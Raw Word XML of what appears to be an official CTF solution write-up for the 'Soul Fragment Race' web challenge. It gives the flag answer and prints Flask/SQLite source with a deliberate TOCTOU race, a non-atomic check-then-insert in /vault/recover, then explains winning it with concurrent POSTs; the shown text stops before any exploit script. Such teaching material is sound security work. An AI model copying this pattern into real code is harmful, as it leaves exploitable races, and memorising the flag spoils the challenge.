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1D4ED8"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>BYTE ME CTF  •  OFFICIAL SOLUTION WRITEUP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="200"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:b/>
          <w:color w:val="1E3A8A"/>
          <w:sz w:val="44"/>
        </w:rPr>
        <w:t>Soul Fragment Race (Web, Expert)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1E3A8A"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="12" w:space="0" w:color="1E3A8A"/>
              <w:left w:val="single" w:sz="12" w:space="0" w:color="1E3A8A"/>
              <w:bottom w:val="single" w:sz="12" w:space="0" w:color="1E3A8A"/>
              <w:right w:val="single" w:sz="12" w:space="0" w:color="1E3A8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6768"/>
            <w:shd w:fill="1E3A8A"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="12" w:space="0" w:color="1E3A8A"/>
              <w:left w:val="single" w:sz="12" w:space="0" w:color="1E3A8A"/>
              <w:bottom w:val="single" w:sz="12" w:space="0" w:color="1E3A8A"/>
              <w:right w:val="single" w:sz="12" w:space="0" w:color="1E3A8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2592"/>
            <w:shd w:fill="F8FAFC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3A8A"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Author</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6768"/>
            <w:shd w:fill="F8FAFC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F2937"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Pratik Jadhav</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2592"/>
            <w:shd w:fill="FFFFFF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3A8A"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6768"/>
            <w:shd w:fill="FFFFFF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F2937"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Web / Race Condition</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2592"/>
            <w:shd w:fill="F8FAFC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3A8A"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Difficulty</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6768"/>
            <w:shd w:fill="F8FAFC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F2937"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Expert</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pP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Challenge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none"/>
              <w:left w:val="single" w:sz="36" w:space="0" w:color="1E3A8A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60" w:type="dxa"/>
            </w:tcMar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b/>
                <w:color w:val="1E3A8A"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CHALLENGE BRIEFING &amp; LORE</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
                <w:i/>
                <w:color w:val="1F2937"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Trace the asynchronous verification flow and recover the final Soul Fragment. Create an account to begin. The Soul Vault allows only one active reservation at a time, yet whispers speak of contradictory proofs opening the seventh seal.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b/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Given:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> A multi-user web application tracking Soul Fragments at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/login</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.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F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Target URL:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>https://byteme-soul-fragment-race.onrender.com/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> (or local </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://127.0.0.1:5000/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>)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F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Flag Format:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>OWASP{...}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> (or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FLAG{...}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>)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Summary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Soul Fragment Race is an advanced concurrency challenge revolving around Time-of-Check to Time-of-Use (TOCTOU) race conditions in asynchronous state machines. A user starts with 6 out of 7 Soul Fragments. Claiming the final fragment requires presenting "contradictory proof"—specifically, having two separate recovery attempts in a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>verified</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> state at the exact same moment. While the application attempts to enforce a single-reservation rule, the check occurs before database insertion without synchronization primitives. By sending burst-synchronized concurrent POST requests to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/vault/recover</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>, we cause two overlapping attempts to be accepted and verified by background worker threads simultaneously, satisfying the guardian's claim requirement and extracting the flag.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Flag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Borders>
              <w:top w:val="single" w:sz="24" w:space="0" w:color="10B981"/>
              <w:left w:val="single" w:sz="24" w:space="0" w:color="10B981"/>
              <w:bottom w:val="single" w:sz="24" w:space="0" w:color="10B981"/>
              <w:right w:val="single" w:sz="24" w:space="0" w:color="10B981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hAnsi="Segoe UI"/>
                <w:b/>
                <w:color w:val="059669"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>FLAG RECOVERED</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b/>
                <w:color w:val="059669"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>OWASP{byteme_soul_fragment_race}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*(Local environment default: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FLAG{byteme_soul_fragment_race}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>)*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="E2E8F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Step 1 — Exploring the Application &amp; State Machine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Navigating to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/login</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> presents the user authentication interface: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l_fragment_race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748B"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Figure 1: Soul Fragment Race Login Page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Registering a new account and logging in directs the user to the Soul Vault dashboard (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>):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l_fragment_race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748B"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Figure 2: Soul Fragment Dashboard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The dashboard presents the following user state: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Fragments Held:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>6 / 7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Soul State:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sealed (Awakened: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>False</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">, Burned: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>False</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20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Actions:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> A button labeled </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:b/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>"Initiate Recovery"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> and a status polling console.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Inspecting browser network activity reveals regular polling to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/api/status</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>, returning: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"fragments": 6,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"burned": false,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"awakened": false,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"attempts": [],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"events": []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Clicking </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:b/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>"Initiate Recovery"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> issues a POST request to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/vault/recover</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20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"attempt": "6f2a89c1e74b830d12a9bc41",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"status": "pending",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"expires": 1728564010.52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l_fragment_race_recovery_tok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748B"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Figure 3: Recovery Attempt Initiated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A short moment later, the UI indicates the attempt transitioned from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>reserved</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>verified</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">. However, clicking </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:b/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>"Claim Fragment"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> triggers an error: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"error": "the final fragment resists a single proof",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"hint": "the keeper expects contradictory proof"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l_fragment_race_rejec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748B"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Figure 4: Single Attempt Claim Rejection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Step 2 — Source Code Audit (`app.py`)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Analyzing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>app.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> reveals the underlying database schema and endpoint logic:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="200" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:b/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Database Tables: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CREATE TABLE users (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id INTEGER PRIMARY KEY AUTOINCREMENT,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username TEXT UNIQUE NOT NULL,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password_hash TEXT NOT NULL,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fragments INTEGER NOT NULL DEFAULT 6,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burned INTEGER NOT NULL DEFAULT 0,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awakened INTEGER NOT NULL DEFAULT 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);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CREATE TABLE attempts (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id TEXT PRIMARY KEY,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user_id INTEGER NOT NULL,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status TEXT NOT NULL,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created REAL NOT NULL,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expires REAL NOT NULL,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FOREIGN KEY(user_id) REFERENCES users(id)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);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F2937"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>The Recovery Workflow (`/vault/recover`)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@app.route("/vault/recover", methods=["POST"])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def recover():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u = current_user()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not u: return jsonify(error="unauthorized"), 401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u["burned"]: return jsonify(error="account burned"), 403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 = db()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count = c.execute("SELECT COUNT(*) AS n FROM attempts WHERE user_id=?", (u["id"],)).fetchone()["n"]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count &gt;= MAX_ATTEMPTS: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c.execute("UPDATE users SET burned=1 WHERE id=?", (u["id"],))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c.commit(); c.close()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return jsonify(error="attempt budget exhausted"), 429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# VULNERABILITY: Non-atomic reservation check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active = c.execute("""SELECT id FROM attempts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WHERE user_id=? AND status IN ('reserved','verified')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AND expires&gt;? LIMIT 1""", (u["id"], time.time())).fetchone()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active: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c.close()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return jsonify(error="active reservation exists"), 409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aid = secrets.token_hex(12)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now = time.time()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c.execute("INSERT INTO attempts(id,user_id,status,created,expires) VALUES(?,?,?,?,?)",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(aid, u["id"], "reserved", now, now + 3))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c.commit(); c.close()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log_event(u["id"], aid, "reserved")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threading.Thread(target=worker, args=(aid,), daemon=True).start()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return jsonify(attempt=aid, status="pending", expires=now + 3)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F2937"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>The Background Worker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def worker(attempt_id):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time.sleep(random.uniform(0.002, 0.020))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 = db()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a = c.execute("SELECT * FROM attempts WHERE id=?", (attempt_id,)).fetchone()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not a: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c.close(); return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u = c.execute("SELECT * FROM users WHERE id=?", (a["user_id"],)).fetchone()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not u or u["burned"]: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c.close(); return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a["status"] == "reserved" and a["expires"] &gt; time.time():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c.execute("UPDATE attempts SET status='verified' WHERE id=?", (attempt_id,))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c.commit()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c.close()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log_event(u["id"], attempt_id, "verified")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return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c.close()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F2937"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>The Claim Requirement (`/vault/claim`)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@app.route("/vault/claim", methods=["POST"])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def claim():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u = current_user()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not u: return jsonify(error="unauthorized"), 401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aid = (request.json or {}).get("attempt", "")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 = db()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a = c.execute("SELECT * FROM attempts WHERE id=? AND user_id=?", (aid, u["id"])).fetchone()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not a or a["status"] != "verified":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c.close(); return jsonify(error="not verified"), 409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# CRITICAL CHECK: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verified = c.execute("""SELECT COUNT(*) AS n FROM attempts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WHERE user_id=? AND status='verified'""", (u["id"],)).fetchone()["n"]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verified &lt; 2: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c.close()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return jsonify(error="the final fragment resists a single proof",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hint="the keeper expects contradictory proof"), 403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c.execute("UPDATE users SET fragments=7, awakened=1 WHERE id=?", (u["id"],))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c.commit(); c.close()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log_event(u["id"], aid, "vault_awakened")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return jsonify(status="awakened", flag=FLAG)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pP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Step 3 — Vulnerability Analysis (TOCTOU Race Condition)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Examining </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/vault/recover</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> reveals a classic </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:b/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Time-of-Check to Time-of-Use (TOCTOU)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> window: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recover()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> queries the database: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>SELECT id FROM attempts WHERE user_id=? AND status IN ('reserved','verified') AND expires&gt;?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937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If no active attempt exists, it generates a new token and executes </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>INSERT INTO attempts(...)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937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>Because SQLite transactions are opened and committed per-function without row locks (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>EXCLUSIVE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> lock or atomic upserts), there is a discrete time gap between the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>SELECT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> check and the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>INSERT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> statement.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If two HTTP requests arrive concurrently within a few milliseconds, both execute the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>SELECT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> query before either has committed an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>INSERT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937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Both requests pass the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>if active:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> gate and successfully insert two distinct </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>reserved</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> records.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>Two separate background threads are spawned. Both threads sleep briefly (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>2ms - 20ms</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">) and update their respective records to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>status='verified'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937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Once both attempts are marked </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>verified</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">, the database contains </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>verified &gt;= 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">. Calling </w:t>
      </w:r>
      <w:r>
        <w:rPr>
